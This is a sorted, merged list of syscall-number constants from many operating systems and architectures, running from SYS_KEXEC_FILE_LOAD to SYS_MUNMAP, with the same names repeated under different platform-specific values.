SYS_KEXEC_FILE_LOAD         = 294
SYS_KEXEC_FILE_LOAD         = 320
SYS_KEXEC_FILE_LOAD         = 381
SYS_KEXEC_FILE_LOAD         = 382
SYS_KEXEC_LOAD                   = 268
SYS_KEXEC_LOAD                   = 283
SYS_KEXEC_LOAD                   = 347
SYS_KEXEC_LOAD                   = 4311
SYS_KEXEC_LOAD              = 104
SYS_KEXEC_LOAD              = 246
SYS_KEXEC_LOAD              = 268
SYS_KEXEC_LOAD              = 277
SYS_KEXEC_LOAD              = 306
SYS_KEXEC_LOAD              = 5270
SYS_KEYCTL                       = 271
SYS_KEYCTL                       = 288
SYS_KEYCTL                       = 311
SYS_KEYCTL                       = 4282
SYS_KEYCTL                  = 219
SYS_KEYCTL                  = 250
SYS_KEYCTL                  = 271
SYS_KEYCTL                  = 280
SYS_KEYCTL                  = 283
SYS_KEYCTL                  = 5241
SYS_KILL                            = 0x1A4
SYS_KILL                           = 37
SYS_KILL                         = 37
SYS_KILL                         = 4037
SYS_KILL                    = 129
SYS_KILL                    = 37
SYS_KILL                    = 5060
SYS_KILL                    = 62
SYS_KILL                 = 37  // { int
SYS_KILLPG                          = 0x289
SYS_KLDFIND                  = 306 // { int kldfind(const char 
SYS_KLDFIND                = 306 // { int kldfind(const char 
SYS_KLDFIRSTMOD              = 309 // { int kldfirstmod(int fileid)
SYS_KLDFIRSTMOD            = 309 // { int kldfirstmod(int fileid)
SYS_KLDLOAD                  = 304 // { int kldload(const char 
SYS_KLDLOAD                = 304 // { int kldload(const char 
SYS_KLDNEXT                  = 307 // { int kldnext(int fileid)
SYS_KLDNEXT                = 307 // { int kldnext(int fileid)
SYS_KLDUNLOAD                = 305 // { int kldunload(int fileid)
SYS_KLDUNLOAD              = 305 // { int kldunload(int fileid)
SYS_KMQ_OPEN                 = 457 // { int kmq_open(const char 
SYS_KMQ_UNLINK               = 462 // { int kmq_unlink(const char 
SYS_KQUEUE                         = 362
SYS_KQUEUE                   = 362 // { int kqueue(void)
SYS_KQUEUE                 = 362 // { int kqueue(void)
SYS_KQUEUE               = 344 // { int
SYS_KQUEUE         = 269 // { int sys_kqueue(void)
SYS_KQUEUE1              = 455 // { int
SYS_KQUEUE_WORKLOOP_CTL            = 530
SYS_KSEM_CLOSE               = 400 // { int ksem_close(semid_t id)
SYS_KSEM_DESTROY             = 408 // { int ksem_destroy(semid_t id)
SYS_KSEM_INIT                = 404 // { int ksem_init(semid_t 
SYS_KSEM_OPEN                = 405 // { int ksem_open(semid_t 
SYS_KSEM_POST                = 401 // { int ksem_post(semid_t id)
SYS_KSEM_TRYWAIT             = 403 // { int ksem_trywait(semid_t id)
SYS_KSEM_UNLINK              = 406 // { int ksem_unlink(const char 
SYS_KSEM_WAIT                = 402 // { int ksem_wait(semid_t id)
SYS_KTIMER_DELETE            = 236 // { int ktimer_delete(int timerid)
SYS_KTIMER_GETOVERRUN        = 239 // { int ktimer_getoverrun(int timerid)
SYS_KTRACE                   = 45  // { int ktrace(const char 
SYS_KTRACE                 = 45  // { int ktrace(const char 
SYS_KTRACE               = 45  // { int
SYS_KTRACE         = 45  // { int sys_ktrace(const char 
SYS_L64A                            = 0x2F0
SYS_LABS                            = 0x092
SYS_LANDLOCK_ADD_RULE            = 4445
SYS_LANDLOCK_ADD_RULE            = 445
SYS_LANDLOCK_ADD_RULE       = 445
SYS_LANDLOCK_ADD_RULE       = 5445
SYS_LANDLOCK_CREATE_RULESET      = 444
SYS_LANDLOCK_CREATE_RULESET      = 4444
SYS_LANDLOCK_CREATE_RULESET = 444
SYS_LANDLOCK_CREATE_RULESET = 5444
SYS_LANDLOCK_RESTRICT_SELF       = 4446
SYS_LANDLOCK_RESTRICT_SELF       = 446
SYS_LANDLOCK_RESTRICT_SELF  = 446
SYS_LANDLOCK_RESTRICT_SELF  = 5446
SYS_LCHFLAGS                 = 391 // { int lchflags(const char 
SYS_LCHFLAGS               = 391 // { int lchflags(const char 
SYS_LCHFLAGS             = 304 // { int
SYS_LCHMOD                   = 274 // { int lchmod(char 
SYS_LCHMOD                 = 274 // { int lchmod(char 
SYS_LCHMOD               = 274 // { int
SYS_LCHOWN                          = 0x29B
SYS_LCHOWN                         = 364
SYS_LCHOWN                       = 16
SYS_LCHOWN                       = 4016
SYS_LCHOWN                   = 254 // { int lchown(char 
SYS_LCHOWN                  = 16
SYS_LCHOWN                  = 198
SYS_LCHOWN                  = 5092
SYS_LCHOWN                  = 94
SYS_LCHOWN                 = 254 // { int lchown(char 
SYS_LCHOWN               = 275 // { int
SYS_LCHOWN         = 254 // { int sys_lchown(const char 
SYS_LCHOWN32                     = 198
SYS_LCONG48                         = 0x2EA
SYS_LDEXP                           = 0x01E
SYS_LDEXPD128                       = 0xBD7
SYS_LDEXPD32                        = 0xBD5
SYS_LDEXPD64                        = 0xBD6
SYS_LDEXPF                          = 0x65B
SYS_LDEXPL                          = 0x65C
SYS_LDIV                            = 0x24D
SYS_LEAVEWOR                        = 0x4B8
SYS_LEAVEWORKUNIT                   = 0x4B8
SYS_LEDGER                         = 373
SYS_LFIND                           = 0x2C9
SYS_LGAMMA                          = 0x32C
SYS_LGAMMAD128                      = 0xBDA
SYS_LGAMMAD32                       = 0xBD8
SYS_LGAMMAD64                       = 0xBD9
SYS_LGAMMAF                         = 0x895
SYS_LGAMMAL                         = 0x896
SYS_LGAMMA_R                        = 0x4EB
SYS_LGETFH                   = 160 // { int lgetfh(char 
SYS_LGETXATTR                    = 213
SYS_LGETXATTR                    = 230
SYS_LGETXATTR                    = 4228
SYS_LGETXATTR               = 173
SYS_LGETXATTR               = 192
SYS_LGETXATTR               = 213
SYS_LGETXATTR               = 228
SYS_LGETXATTR               = 5184
SYS_LGETXATTR               = 9
SYS_LGETXATTR            = 379 // { int
SYS_LINK                            = 0x1A5
SYS_LINK                           = 9
SYS_LINK                         = 4009
SYS_LINK                         = 9
SYS_LINK                     = 9   // { int link(char 
SYS_LINK                    = 5084
SYS_LINK                    = 86
SYS_LINK                    = 9
SYS_LINK                   = 9   // { int link(char 
SYS_LINK                 = 9   // { int
SYS_LINK           = 9   // { int sys_link(const char 
SYS_LINKAT                         = 471
SYS_LINKAT                       = 294
SYS_LINKAT                       = 303
SYS_LINKAT                       = 330
SYS_LINKAT                       = 4296
SYS_LINKAT                  = 265
SYS_LINKAT                  = 292
SYS_LINKAT                  = 294
SYS_LINKAT                  = 296
SYS_LINKAT                  = 37
SYS_LINKAT                  = 5255
SYS_LINKAT               = 457 // { int
SYS_LIO_LISTIO                      = 0xC6A
SYS_LIO_LISTIO                     = 320
SYS_LISTEN                          = 0x356
SYS_LISTEN                         = 106
SYS_LISTEN                       = 284
SYS_LISTEN                       = 329
SYS_LISTEN                       = 363
SYS_LISTEN                       = 4174
SYS_LISTEN                  = 201
SYS_LISTEN                  = 329
SYS_LISTEN                  = 354
SYS_LISTEN                  = 363
SYS_LISTEN                  = 50
SYS_LISTEN                  = 5049
SYS_LISTEN               = 106 // { int
SYS_LISTXATTR                      = 240
SYS_LISTXATTR                    = 215
SYS_LISTXATTR                    = 232
SYS_LISTXATTR                    = 4230
SYS_LISTXATTR               = 11
SYS_LISTXATTR               = 178
SYS_LISTXATTR               = 194
SYS_LISTXATTR               = 215
SYS_LISTXATTR               = 230
SYS_LISTXATTR               = 5186
SYS_LISTXATTR            = 381 // { int
SYS_LLABS                           = 0x5CE
SYS_LLDIV                           = 0x5CB
SYS_LLISTXATTR                   = 216
SYS_LLISTXATTR                   = 233
SYS_LLISTXATTR                   = 4231
SYS_LLISTXATTR              = 12
SYS_LLISTXATTR              = 179
SYS_LLISTXATTR              = 195
SYS_LLISTXATTR              = 216
SYS_LLISTXATTR              = 231
SYS_LLISTXATTR              = 5187
SYS_LLISTXATTR           = 382 // { int
SYS_LLRINT                          = 0xA84
SYS_LLRINTD128                      = 0xBDD
SYS_LLRINTD32                       = 0xBDB
SYS_LLRINTD64                       = 0xBDC
SYS_LLRINTF                         = 0xA87
SYS_LLRINTL                         = 0xA8A
SYS_LLROUND                         = 0xA8D
SYS_LLROUNDD128                     = 0xBE0
SYS_LLROUNDD32                      = 0xBDE
SYS_LLROUNDD64                      = 0xBDF
SYS_LLROUNDF                        = 0xA90
SYS_LLROUNDL                        = 0xA93
SYS_LOCALECO                        = 0x243
SYS_LOCALECONV                      = 0x243
SYS_LOCALTIM                        = 0x0B1
SYS_LOCALTIME                       = 0x0B1
SYS_LOCALTIME64                     = 0xCDE
SYS_LOCALTIME64_R                   = 0xCDF
SYS_LOCALTIME_R                     = 0x5E3
SYS_LOCK                         = 4053
SYS_LOCK                         = 53
SYS_LOCK                    = 53
SYS_LOCKF                           = 0x309
SYS_LOG                             = 0x017
SYS_LOG10                           = 0x01C
SYS_LOG10D128                       = 0xBE6
SYS_LOG10D32                        = 0xBE4
SYS_LOG10D64                        = 0xBE5
SYS_LOG10F                          = 0x645
SYS_LOG10L                          = 0x646
SYS_LOG1P                           = 0x327
SYS_LOG1PD128                       = 0xBE9
SYS_LOG1PD32                        = 0xBE7
SYS_LOG1PD64                        = 0xBE8
SYS_LOG1PF                          = 0x885
SYS_LOG1PL                          = 0x886
SYS_LOG2                            = 0x888
SYS_LOG2D128                        = 0xBEC
SYS_LOG2D32                         = 0xBEA
SYS_LOG2D64                         = 0xBEB
SYS_LOG2F                           = 0x887
SYS_LOG2L                           = 0x889
SYS_LOGB                            = 0x326
SYS_LOGBD128                        = 0xBEF
SYS_LOGBD32                         = 0xBED
SYS_LOGBD64                         = 0xBEE
SYS_LOGBF                           = 0xA96
SYS_LOGBL                           = 0xA99
SYS_LOGD128                         = 0xBE3
SYS_LOGD32                          = 0xBE1
SYS_LOGD64                          = 0xBE2
SYS_LOGF                            = 0x647
SYS_LOGL                            = 0x648
SYS_LONGJMP                         = 0x060
SYS_LOOKUP_DCOOKIE               = 235
SYS_LOOKUP_DCOOKIE               = 249
SYS_LOOKUP_DCOOKIE               = 253
SYS_LOOKUP_DCOOKIE               = 4247
SYS_LOOKUP_DCOOKIE          = 110
SYS_LOOKUP_DCOOKIE          = 18
SYS_LOOKUP_DCOOKIE          = 208
SYS_LOOKUP_DCOOKIE          = 212
SYS_LOOKUP_DCOOKIE          = 235
SYS_LOOKUP_DCOOKIE          = 5206
SYS_LPATHCONF                = 513 // { int lpathconf(char 
SYS_LPATHCONF              = 533 // { int lpathconf(char 
SYS_LRAND48                         = 0x2E7
SYS_LREMOVEXATTR                 = 219
SYS_LREMOVEXATTR                 = 236
SYS_LREMOVEXATTR                 = 4234
SYS_LREMOVEXATTR            = 15
SYS_LREMOVEXATTR            = 182
SYS_LREMOVEXATTR            = 198
SYS_LREMOVEXATTR            = 219
SYS_LREMOVEXATTR            = 234
SYS_LREMOVEXATTR            = 5190
SYS_LREMOVEXATTR         = 385 // { int
SYS_LRINT                           = 0xA9C
SYS_LRINTD128                       = 0xBF2
SYS_LRINTD32                        = 0xBF0
SYS_LRINTD64                        = 0xBF1
SYS_LRINTF                          = 0xA9F
SYS_LRINTL                          = 0xAA2
SYS_LROUND                          = 0x898
SYS_LROUNDD128                      = 0xBF5
SYS_LROUNDD32                       = 0xBF3
SYS_LROUNDD64                       = 0xBF4
SYS_LROUNDF                         = 0x897
SYS_LROUNDL                         = 0xAA5
SYS_LSEARCH                         = 0x2CA
SYS_LSEEK                           = 0x1A6
SYS_LSEEK                          = 199
SYS_LSEEK                        = 19
SYS_LSEEK                        = 4019
SYS_LSEEK                   = 19
SYS_LSEEK                   = 5008
SYS_LSEEK                   = 62
SYS_LSEEK                   = 8
SYS_LSEEK                = 199 // { off_t
SYS_LSETXATTR                    = 210
SYS_LSETXATTR                    = 227
SYS_LSETXATTR                    = 4225
SYS_LSETXATTR               = 170
SYS_LSETXATTR               = 189
SYS_LSETXATTR               = 210
SYS_LSETXATTR               = 225
SYS_LSETXATTR               = 5181
SYS_LSETXATTR               = 6
SYS_LSETXATTR            = 376 // { int
SYS_LSTAT                           = 0x1A7
SYS_LSTAT                          = 190
SYS_LSTAT                        = 107
SYS_LSTAT                        = 4107
SYS_LSTAT                    = 190 // { int lstat(char 
SYS_LSTAT                   = 107
SYS_LSTAT                   = 40
SYS_LSTAT                   = 5006
SYS_LSTAT                   = 6
SYS_LSTAT                  = 477 // { int lstat(const char 
SYS_LSTAT                = 441 // { int
SYS_LSTAT          = 40  // { int sys_lstat(const char 
SYS_LSTAT64                        = 340
SYS_LSTAT64                      = 196
SYS_LSTAT64                      = 4214
SYS_LSTAT64                 = 132
SYS_LSTAT64_EXTENDED               = 342
SYS_LSTAT_EXTENDED                 = 280
SYS_LUTIMES                  = 276 // { int lutimes(char 
SYS_LUTIMES                = 276 // { int lutimes(char 
SYS_LUTIMES              = 424 // { int
SYS_LWP_CREATE             = 495 // { int lwp_create(struct lwp_params 
SYS_LWP_CREATE2            = 546 // { int lwp_create2(struct lwp_params 
SYS_LWP_GETTID             = 496 // { lwpid_t lwp_gettid(void)
SYS_MAC_SYSCALL              = 394 // { int mac_syscall(const char 
SYS_MADVISE                        = 75
SYS_MADVISE                      = 205
SYS_MADVISE                      = 219
SYS_MADVISE                      = 220
SYS_MADVISE                      = 4218
SYS_MADVISE                  = 75  // { int madvise(void 
SYS_MADVISE                 = 205
SYS_MADVISE                 = 219
SYS_MADVISE                 = 233
SYS_MADVISE                 = 28
SYS_MADVISE                 = 5027
SYS_MADVISE                 = 75
SYS_MADVISE                = 75  // { int madvise(void 
SYS_MADVISE              = 75  // { int
SYS_MADVISE        = 75  // { int sys_madvise(void 
SYS_MAKECONTEXT                     = 0x432
SYS_MALLOC                          = 0x056
SYS_MATHERR                         = 0x4D0
SYS_MAXCOLL                         = 0x169
SYS_MAXDESC                         = 0x477
SYS_MAXSYSCALL                     = 530
SYS_MAXSYSCALL                     = 532
SYS_MBIND                        = 259
SYS_MBIND                        = 274
SYS_MBIND                        = 319
SYS_MBIND                        = 4268
SYS_MBIND                   = 235
SYS_MBIND                   = 237
SYS_MBIND                   = 259
SYS_MBIND                   = 268
SYS_MBIND                   = 303
SYS_MBIND                   = 5227
SYS_MBLEN                           = 0x0AF
SYS_MBRLEN                          = 0x111
SYS_MBRTOC16                        = 0xD42
SYS_MBRTOC32                        = 0xD43
SYS_MBRTOWC                         = 0x112
SYS_MBSINIT                         = 0x10F
SYS_MBSRTOWC                        = 0x113
SYS_MBSRTOWCS                       = 0x113
SYS_MBSTOWCS                        = 0x085
SYS_MBTOWC                          = 0x083
SYS_MCONTROL               = 485 // { int mcontrol(void 
SYS_MEMBARRIER                   = 365
SYS_MEMBARRIER                   = 375
SYS_MEMBARRIER                   = 389
SYS_MEMBARRIER                   = 4358
SYS_MEMBARRIER              = 283
SYS_MEMBARRIER              = 324
SYS_MEMBARRIER              = 351
SYS_MEMBARRIER              = 356
SYS_MEMBARRIER              = 365
SYS_MEMBARRIER              = 5318
SYS_MEMCCPY                         = 0x2D4
SYS_MEMCHR                          = 0x09B
SYS_MEMCMP                          = 0x09A
SYS_MEMCPY                          = 0x094
SYS_MEMFD_CREATE                 = 356
SYS_MEMFD_CREATE                 = 360
SYS_MEMFD_CREATE                 = 385
SYS_MEMFD_CREATE                 = 4354
SYS_MEMFD_CREATE            = 279
SYS_MEMFD_CREATE            = 319
SYS_MEMFD_CREATE            = 348
SYS_MEMFD_CREATE            = 350
SYS_MEMFD_CREATE            = 360
SYS_MEMFD_CREATE            = 5314
SYS_MEMFD_SECRET                 = 447
SYS_MEMFD_SECRET            = 447
SYS_MEMMOVE                         = 0x095
SYS_MEMORYSTATUS_CONTROL           = 440
SYS_MEMORYSTATUS_GET_LEVEL         = 453
SYS_MEMORY_ORDERING         = 52
SYS_MEMSET                          = 0x0A3
SYS_MICROSTACKSHOT                 = 492
SYS_MIGRATE_PAGES                = 258
SYS_MIGRATE_PAGES                = 294
SYS_MIGRATE_PAGES                = 400
SYS_MIGRATE_PAGES                = 4287
SYS_MIGRATE_PAGES           = 238
SYS_MIGRATE_PAGES           = 256
SYS_MIGRATE_PAGES           = 258
SYS_MIGRATE_PAGES           = 287
SYS_MIGRATE_PAGES           = 302
SYS_MIGRATE_PAGES           = 5246
SYS_MINCORE                        = 78
SYS_MINCORE                      = 206
SYS_MINCORE                      = 218
SYS_MINCORE                      = 219
SYS_MINCORE                      = 4217
SYS_MINCORE                  = 78  // { int mincore(const void 
SYS_MINCORE                 = 206
SYS_MINCORE                 = 218
SYS_MINCORE                 = 232
SYS_MINCORE                 = 27
SYS_MINCORE                 = 5026
SYS_MINCORE                 = 78
SYS_MINCORE                = 78  // { int mincore(const void 
SYS_MINCORE              = 78  // { int
SYS_MINCORE        = 78  // { int sys_mincore(void 
SYS_MINHERIT                       = 250
SYS_MINHERIT                 = 250 // { int minherit(void 
SYS_MINHERIT               = 250 // { int minherit(void 
SYS_MINHERIT             = 273 // { int
SYS_MINHERIT       = 250 // { int sys_minherit(void 
SYS_MKDIR                           = 0x1A8
SYS_MKDIR                          = 136
SYS_MKDIR                        = 39
SYS_MKDIR                        = 4039
SYS_MKDIR                    = 136 // { int mkdir(char 
SYS_MKDIR                   = 136
SYS_MKDIR                   = 39
SYS_MKDIR                   = 5081
SYS_MKDIR                   = 83
SYS_MKDIR                  = 136 // { int mkdir(char 
SYS_MKDIR                = 136 // { int
SYS_MKDIR          = 136 // { int sys_mkdir(const char 
SYS_MKDIRAT                        = 475
SYS_MKDIRAT                      = 287
SYS_MKDIRAT                      = 296
SYS_MKDIRAT                      = 323
SYS_MKDIRAT                      = 4289
SYS_MKDIRAT                 = 258
SYS_MKDIRAT                 = 285
SYS_MKDIRAT                 = 287
SYS_MKDIRAT                 = 289
SYS_MKDIRAT                 = 34
SYS_MKDIRAT                 = 5248
SYS_MKDIRAT              = 461 // { int
SYS_MKDIR_EXTENDED                 = 292
SYS_MKFIFO                          = 0x1A9
SYS_MKFIFO                         = 132
SYS_MKFIFO                   = 132 // { int mkfifo(char 
SYS_MKFIFO                 = 132 // { int mkfifo(char 
SYS_MKFIFO               = 132 // { int
SYS_MKFIFO         = 132 // { int sys_mkfifo(const char 
SYS_MKFIFOAT             = 459 // { int
SYS_MKFIFO_EXTENDED                = 291
SYS_MKNOD                           = 0x1AA
SYS_MKNOD                          = 14
SYS_MKNOD                        = 14
SYS_MKNOD                        = 4014
SYS_MKNOD                    = 14  // { int mknod(char 
SYS_MKNOD                   = 133
SYS_MKNOD                   = 14
SYS_MKNOD                   = 5131
SYS_MKNOD                  = 14  // { int mknod(char 
SYS_MKNOD                = 450 // { int
SYS_MKNOD          = 14  // { int sys_mknod(const char 
SYS_MKNODAT                      = 288
SYS_MKNODAT                      = 297
SYS_MKNODAT                      = 324
SYS_MKNODAT                      = 4290
SYS_MKNODAT                 = 259
SYS_MKNODAT                 = 286
SYS_MKNODAT                 = 288
SYS_MKNODAT                 = 290
SYS_MKNODAT                 = 33
SYS_MKNODAT                 = 5249
SYS_MKNODAT              = 460 // { int
SYS_MKSTEMP                         = 0x305
SYS_MKTEMP                          = 0x306
SYS_MKTIME                          = 0x0AC
SYS_MKTIME64                        = 0xCE0
SYS_MLOCK                          = 203
SYS_MLOCK                        = 150
SYS_MLOCK                        = 4154
SYS_MLOCK                    = 203 // { int mlock(const void 
SYS_MLOCK                   = 149
SYS_MLOCK                   = 150
SYS_MLOCK                   = 228
SYS_MLOCK                   = 237
SYS_MLOCK                   = 5146
SYS_MLOCK                  = 203 // { int mlock(const void 
SYS_MLOCK                = 203 // { int
SYS_MLOCK          = 203 // { int sys_mlock(const void 
SYS_MLOCK2                       = 376
SYS_MLOCK2                       = 378
SYS_MLOCK2                       = 390
SYS_MLOCK2                       = 4359
SYS_MLOCK2                  = 284
SYS_MLOCK2                  = 325
SYS_MLOCK2                  = 356
SYS_MLOCK2                  = 374
SYS_MLOCK2                  = 378
SYS_MLOCK2                  = 5319
SYS_MLOCKALL                       = 324
SYS_MLOCKALL                     = 152
SYS_MLOCKALL                     = 4156
SYS_MLOCKALL                 = 324 // { int mlockall(int how)
SYS_MLOCKALL                = 151
SYS_MLOCKALL                = 152
SYS_MLOCKALL                = 230
SYS_MLOCKALL                = 239
SYS_MLOCKALL                = 5148
SYS_MLOCKALL               = 324 // { int mlockall(int how)
SYS_MLOCKALL             = 242 // { int
SYS_MLOCKALL       = 271 // { int sys_mlockall(int flags)
SYS_MMAP                            = 0x295
SYS_MMAP                           = 197
SYS_MMAP                         = 4090
SYS_MMAP                         = 90
SYS_MMAP                    = 222
SYS_MMAP                    = 5009
SYS_MMAP                    = 71
SYS_MMAP                    = 9
SYS_MMAP                    = 90
SYS_MMAP                 = 197 // { void 
SYS_MMAP           = 197 // { void 
SYS_MMAP2                        = 192
SYS_MMAP2                        = 4210
SYS_MODCTL               = 246 // { int
SYS_MODF                            = 0x01B
SYS_MODFD128                        = 0xBF8
SYS_MODFD32                         = 0xBF6
SYS_MODFD64                         = 0xBF7
SYS_MODFF                           = 0x65D
SYS_MODFIND                  = 303 // { int modfind(const char 
SYS_MODFIND                = 303 // { int modfind(const char 
SYS_MODFL                           = 0x65E
SYS_MODFNEXT                 = 302 // { int modfnext(int modid)
SYS_MODFNEXT               = 302 // { int modfnext(int modid)
SYS_MODIFY_LDT                   = 123
SYS_MODIFY_LDT                   = 4123
SYS_MODIFY_LDT              = 123
SYS_MODIFY_LDT              = 154
SYS_MODNEXT                  = 300 // { int modnext(int modid)
SYS_MODNEXT                = 300 // { int modnext(int modid)
SYS_MODWATCH                       = 233
SYS_MOUNT                           = 0x1AB
SYS_MOUNT                          = 167
SYS_MOUNT                        = 21
SYS_MOUNT                        = 4021
SYS_MOUNT                    = 21  // { int mount(char 
SYS_MOUNT                   = 165
SYS_MOUNT                   = 167
SYS_MOUNT                   = 21
SYS_MOUNT                   = 40
SYS_MOUNT                   = 5160
SYS_MOUNT                  = 21  // { int mount(char 
SYS_MOUNT                = 410 // { int
SYS_MOUNT          = 21  // { int sys_mount(const char 
SYS_MOUNT       = 46
SYS_MOUNTCTL               = 468 // { int mountctl(const char 
SYS_MOUNT_SETATTR                = 442
SYS_MOUNT_SETATTR                = 4442
SYS_MOUNT_SETATTR           = 442
SYS_MOUNT_SETATTR           = 5442
SYS_MOVE_MOUNT                   = 429
SYS_MOVE_MOUNT                   = 4429
SYS_MOVE_MOUNT              = 429
SYS_MOVE_MOUNT              = 5429
SYS_MOVE_PAGES                   = 301
SYS_MOVE_PAGES                   = 317
SYS_MOVE_PAGES                   = 344
SYS_MOVE_PAGES                   = 4308
SYS_MOVE_PAGES              = 239
SYS_MOVE_PAGES              = 279
SYS_MOVE_PAGES              = 301
SYS_MOVE_PAGES              = 307
SYS_MOVE_PAGES              = 310
SYS_MOVE_PAGES              = 5267
SYS_MPROTECT                        = 0x296
SYS_MPROTECT                       = 74
SYS_MPROTECT                     = 125
SYS_MPROTECT                     = 4125
SYS_MPROTECT                 = 74  // { int mprotect(const void 
SYS_MPROTECT                = 10
SYS_MPROTECT                = 125
SYS_MPROTECT                = 226
SYS_MPROTECT                = 5010
SYS_MPROTECT                = 74
SYS_MPROTECT               = 74  // { int mprotect(void 
SYS_MPROTECT             = 74  // { int
SYS_MPROTECT       = 74  // { int sys_mprotect(void 
SYS_MPX                          = 4056
SYS_MPX                          = 56
SYS_MPX                     = 56
SYS_MQUERY         = 286 // { void 
SYS_MQ_CLOSE               = 511 // { int mq_close(mqd_t mqdes)
SYS_MQ_GETSETATTR                = 267
SYS_MQ_GETSETATTR                = 279
SYS_MQ_GETSETATTR                = 282
SYS_MQ_GETSETATTR                = 4276
SYS_MQ_GETSETATTR           = 185
SYS_MQ_GETSETATTR           = 245
SYS_MQ_GETSETATTR           = 267
SYS_MQ_GETSETATTR           = 276
SYS_MQ_GETSETATTR           = 278
SYS_MQ_GETSETATTR           = 5235
SYS_MQ_NOTIFY                    = 266
SYS_MQ_NOTIFY                    = 278
SYS_MQ_NOTIFY                    = 281
SYS_MQ_NOTIFY                    = 4275
SYS_MQ_NOTIFY               = 184
SYS_MQ_NOTIFY               = 244
SYS_MQ_NOTIFY               = 266
SYS_MQ_NOTIFY               = 275
SYS_MQ_NOTIFY               = 277
SYS_MQ_NOTIFY               = 5234
SYS_MQ_OPEN                      = 262
SYS_MQ_OPEN                      = 274
SYS_MQ_OPEN                      = 277
SYS_MQ_OPEN                      = 4271
SYS_MQ_OPEN                 = 180
SYS_MQ_OPEN                 = 240
SYS_MQ_OPEN                 = 262
SYS_MQ_OPEN                 = 271
SYS_MQ_OPEN                 = 273
SYS_MQ_OPEN                 = 5230
SYS_MQ_OPEN                = 510 // { mqd_t mq_open(const char 
SYS_MQ_TIMEDRECEIVE              = 265
SYS_MQ_TIMEDRECEIVE              = 277
SYS_MQ_TIMEDRECEIVE              = 280
SYS_MQ_TIMEDRECEIVE              = 4274
SYS_MQ_TIMEDRECEIVE         = 183
SYS_MQ_TIMEDRECEIVE         = 243
SYS_MQ_TIMEDRECEIVE         = 265
SYS_MQ_TIMEDRECEIVE         = 274
SYS_MQ_TIMEDRECEIVE         = 276
SYS_MQ_TIMEDRECEIVE         = 5233
SYS_MQ_TIMEDRECEIVE_TIME64       = 419
SYS_MQ_TIMEDRECEIVE_TIME64       = 4419
SYS_MQ_TIMEDSEND                 = 264
SYS_MQ_TIMEDSEND                 = 276
SYS_MQ_TIMEDSEND                 = 279
SYS_MQ_TIMEDSEND                 = 4273
SYS_MQ_TIMEDSEND            = 182
SYS_MQ_TIMEDSEND            = 242
SYS_MQ_TIMEDSEND            = 264
SYS_MQ_TIMEDSEND            = 273
SYS_MQ_TIMEDSEND            = 275
SYS_MQ_TIMEDSEND            = 5232
SYS_MQ_TIMEDSEND_TIME64          = 418
SYS_MQ_TIMEDSEND_TIME64          = 4418
SYS_MQ_UNLINK                    = 263
SYS_MQ_UNLINK                    = 275
SYS_MQ_UNLINK                    = 278
SYS_MQ_UNLINK                    = 4272
SYS_MQ_UNLINK               = 181
SYS_MQ_UNLINK               = 241
SYS_MQ_UNLINK               = 263
SYS_MQ_UNLINK               = 272
SYS_MQ_UNLINK               = 274
SYS_MQ_UNLINK               = 5231
SYS_MQ_UNLINK              = 512 // { int mq_unlink(const char 
SYS_MRAND48                         = 0x2E8
SYS_MREMAP                       = 163
SYS_MREMAP                       = 4167
SYS_MREMAP                  = 163
SYS_MREMAP                  = 216
SYS_MREMAP                  = 25
SYS_MREMAP                  = 250
SYS_MREMAP                  = 5024
SYS_MREMAP               = 411 // { void 
SYS_MREMAP_ENCRYPTED               = 489
SYS_MSGCTL                          = 0x275
SYS_MSGCTL                         = 258
SYS_MSGCTL                       = 304
SYS_MSGCTL                       = 402
SYS_MSGCTL                       = 4402
SYS_MSGCTL                  = 187
SYS_MSGCTL                  = 402
SYS_MSGCTL                  = 5069
SYS_MSGCTL                  = 71
SYS_MSGCTL               = 444 // { int
SYS_MSGGET                          = 0x276
SYS_MSGGET                         = 259
SYS_MSGGET                       = 303
SYS_MSGGET                       = 399
SYS_MSGGET                       = 4399
SYS_MSGGET                  = 186
SYS_MSGGET                  = 399
SYS_MSGGET                  = 5066
SYS_MSGGET                  = 68
SYS_MSGGET               = 225 // { int
SYS_MSGRCV                          = 0x277
SYS_MSGRCV                         = 261
SYS_MSGRCV                       = 302
SYS_MSGRCV                       = 401
SYS_MSGRCV                       = 4401
SYS_MSGRCV                  = 188
SYS_MSGRCV                  = 401
SYS_MSGRCV                  = 5068
SYS_MSGRCV                  = 70
SYS_MSGRCV               = 227 // { ssize_t
SYS_MSGRCV_NOCANCEL                = 419
SYS_MSGSND                          = 0x278
SYS_MSGSND                         = 260
SYS_MSGSND                       = 301
SYS_MSGSND                       = 400
SYS_MSGSND                       = 4400
SYS_MSGSND                  = 189
SYS_MSGSND                  = 400
SYS_MSGSND                  = 5067
SYS_MSGSND                  = 69
SYS_MSGSND               = 226 // { int
SYS_MSGSND_NOCANCEL                = 418
SYS_MSGSYS                         = 252
SYS_MSGXRCV                         = 0x279
SYS_MSYNC                           = 0x297
SYS_MSYNC                          = 65
SYS_MSYNC                        = 144
SYS_MSYNC                        = 4144
SYS_MSYNC                    = 65  // { int msync(void 
SYS_MSYNC                   = 144
SYS_MSYNC                   = 227
SYS_MSYNC                   = 26
SYS_MSYNC                   = 5025
SYS_MSYNC                   = 65
SYS_MSYNC                  = 65  // { int msync(void 
SYS_MSYNC                = 277 // { int
SYS_MSYNC          = 256 // { int sys_msync(void 
SYS_MSYNC_NOCANCEL                 = 405
SYS_MSYSCALL       = 37  // { int sys_msyscall(void 
SYS_MULTIPLEXER                  = 201
SYS_MULTIPLEXER             = 201
SYS_MUNLOCK                        = 204
SYS_MUNLOCK                      = 151
SYS_MUNLOCK                      = 4155
SYS_MUNLOCK                  = 204 // { int munlock(const void 
SYS_MUNLOCK                 = 150
SYS_MUNLOCK                 = 151
SYS_MUNLOCK                 = 229
SYS_MUNLOCK                 = 238
SYS_MUNLOCK                 = 5147
SYS_MUNLOCK                = 204 // { int munlock(const void 
SYS_MUNLOCK              = 204 // { int
SYS_MUNLOCK        = 204 // { int sys_munlock(const void 
SYS_MUNLOCKALL                     = 325
SYS_MUNLOCKALL                   = 153
SYS_MUNLOCKALL                   = 4157
SYS_MUNLOCKALL               = 325 // { int munlockall(void)
SYS_MUNLOCKALL              = 152
SYS_MUNLOCKALL              = 153
SYS_MUNLOCKALL              = 231
SYS_MUNLOCKALL              = 240
SYS_MUNLOCKALL              = 5149
SYS_MUNLOCKALL             = 325 // { int munlockall(void)
SYS_MUNLOCKALL           = 243 // { int
SYS_MUNLOCKALL     = 272 // { int sys_munlockall(void)
SYS_MUNMAP                          = 0x298
SYS_MUNMAP                         = 73
SYS_MUNMAP                       = 4091
SYS_MUNMAP                       = 91
